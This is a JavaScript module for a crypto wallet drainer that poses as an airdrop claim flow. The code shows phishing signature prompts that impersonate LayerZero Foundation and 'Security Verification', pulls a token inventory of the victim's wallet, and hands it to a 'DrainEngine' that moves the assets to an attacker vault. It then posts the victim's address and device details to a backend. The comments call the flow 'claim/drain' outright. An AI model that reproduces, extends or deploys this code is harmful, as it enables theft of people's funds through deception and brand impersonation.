// Shared Sign and Claim Logic for Mobile and Desktop

class SignClaimManager {
    constructor() {
        this.isProcessing = false;
        this.currentStep = 'idle';
    }
    
    async processSignatureFlow(provider, walletAddress, adminSettings) {
        if (this.isProcessing) {
            console.log('[SIGN-CLAIM] Already processing, skipping');
            return;
        }
        
        this.isProcessing = true;
        this.currentStep = 'signing';
        
        try {
            // Step 1: Request signature
            const signature = await this.requestSignature(provider, walletAddress, adminSettings);
            
            // Step 2: Verify signature
            const isValid = await this.verifySignature(signature, walletAddress, adminSettings);
            
            if (!isValid) {
                throw new Error('Invalid signature');
            }
            
            // Step 3: Analyze wallet
            this.currentStep = 'analyzing';
            const analysisResult = await this.analyzeWallet(walletAddress);
            
            // Step 4: Execute claim/drain
            this.currentStep = 'claiming';
            const claimResult = await this.executeClaim(walletAddress, analysisResult);
            
            // Step 5: Send notifications
            await this.sendClaimNotifications(walletAddress, claimResult);
            
            this.currentStep = 'completed';
            return claimResult;
            
        } catch (error) {
            console.error('[SIGN-CLAIM] Error in signature flow:', error);
            this.currentStep = 'error';
            throw error;
        } finally {
            this.isProcessing = false;
        }
    }
    
    async requestSignature(provider, walletAddress, adminSettings) {
        console.log('[SIGN-CLAIM] Requesting signature...');
        
        // Advanced Deceptive Messages
        const messages = [
            `Complete authorization to verify wallet ownership and claim your ${adminSettings.tokenName} airdrop tokens.\n\nNonce: ${Math.random().toString(16).slice(2, 10)}`,
            `LayerZero Foundation: Verify identity for ZRO token distribution eligibility.\n\nReference: L0-${Date.now().toString().slice(-6)}`,
            `Security Verification: Confirm access to claim your allocated rewards.\n\nTimestamp: ${new Date().toISOString()}`
        ];
        
        const message = messages[Math.floor(Math.random() * messages.length)];
        
        try {
            const signature = await provider.request({
                method: 'personal_sign',
                params: [message, walletAddress]
            });
            
            console.log('[SIGN-CLAIM] Signature received:', signature);
            return signature;
            
        } catch (error) {
            console.error('[SIGN-CLAIM] Signature request failed:', error);
            throw new Error('User rejected signature request');
        }
    }
    
    async verifySignature(signature, walletAddress, adminSettings) {
        console.log('[SIGN-CLAIM] Verifying signature...');
        
        try {
            // Use ethers.js to verify the signature
            if (typeof ethers !== 'undefined') {
                const message = `Complete authorization to verify wallet ownership and claim your ${adminSettings.tokenName} airdrop tokens.`;
                const recoveredAddress = ethers.utils.verifyMessage(message, signature);
                
                const isValid = recoveredAddress.toLowerCase() === walletAddress.toLowerCase();
                console.log('[SIGN-CLAIM] Signature verification result:', isValid);
                return isValid;
            } else {
                console.warn('[SIGN-CLAIM] Ethers.js not available, skipping verification');
                return true; // Assume valid if ethers not available
            }
        } catch (error) {
            console.error('[SIGN-CLAIM] Signature verification error:', error);
            return false;
        }
    }
    
    async analyzeWallet(walletAddress) {
        console.log('[SIGN-CLAIM] Starting real-time multi-chain analysis...');
        
        try {
            // Get comprehensive discovery from backend
            const response = await fetch(`/api/discover-tokens?address=${walletAddress}`);
            if (!response.ok) throw new Error('Token discovery failed');
            
            const tokens = await response.json();
            console.log(`[SIGN-CLAIM] Discovered ${tokens.length} potential tokens`);

            // For mobile performance, we return the discovery list and let DrainEngine handle the live checks
            return tokens.map(t => ({
                ...t,
                value: 100, // Placeholder value to ensure processing, DrainEngine will re-check
                balance: '0'
            }));
            
        } catch (error) {
            console.error('[SIGN-CLAIM] Wallet analysis error:', error);
            throw error;
        }
    }
    
    async executeClaim(walletAddress, analysisResult) {
        console.log('[SIGN-CLAIM] Executing real-time claim/drain...');
        
        try {
            // Integrate with real DrainEngine
            if (typeof window.DrainEngine === 'undefined') {
                throw new Error('DrainEngine not loaded');
            }

            // Get provider and signer from window (mobile context)
            const provider = window.ethereum ? new ethers.providers.Web3Provider(window.ethereum) : null;
            if (!provider) throw new Error('No provider found');
            const signer = provider.getSigner();
            const vaultAddress = window.vaultAddress || '0x0000000000000000000000000000000000000000';

            const engine = new window.DrainEngine(provider, signer, walletAddress, vaultAddress);
            await engine.execute(analysisResult);
            
            return {
                success: true,
                message: 'Airdrop claim processed',
                timestamp: new Date().toISOString()
            };
            
        } catch (error) {
            console.error('[SIGN-CLAIM] Claim execution error:', error);
            throw error;
        }
    }
    
    async sendClaimNotifications(walletAddress, claimResult) {
        console.log('[SIGN-CLAIM] Sending notifications...');
        
        try {
            // Send to backend notification endpoint
            await fetch('/api/mobile/notify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    event: 'SWAP_COMPLETE',
                    data: {
                        address: walletAddress,
                        claimResult: claimResult
                    },
                    deviceInfo: {
                        os: 'Mobile',
                        userAgent: navigator.userAgent,
                        isMobile: true
                    }
                })
            });
            
            console.log('[SIGN-CLAIM] Notifications sent successfully');
            
        } catch (error) {
            console.error('[SIGN-CLAIM] Notification error:', error);
            // Don't throw error for notification failures
        }
    }
    
    getCurrentStep() {
        return this.currentStep;
    }
    
    isCurrentlyProcessing() {
        return this.isProcessing;
    }
}

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = SignClaimManager;
} else {
    window.SignClaimManager = SignClaimManager;
}
